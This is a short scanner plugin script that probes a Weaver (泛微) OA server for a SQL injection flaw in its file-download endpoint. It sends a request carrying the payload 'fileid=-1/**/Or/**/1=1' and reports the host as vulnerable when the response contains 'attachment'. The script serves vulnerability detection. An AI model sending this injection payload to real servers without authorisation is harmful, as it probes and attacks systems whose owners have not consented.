#request url = var
#define payload = /weaver/weaver.email.FileDownloadLocation?download=1&fileid=-1/**/Or/**/1=1
#define bug = attachment
#define info = 存在泛微OA filedownaction SQL注入漏洞

function main(args)
{
	res = HttpGet(url.payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
	if(StrFindStr(res[0],bug,0)!= "-1")
	{
		print(url.info);
	}
}
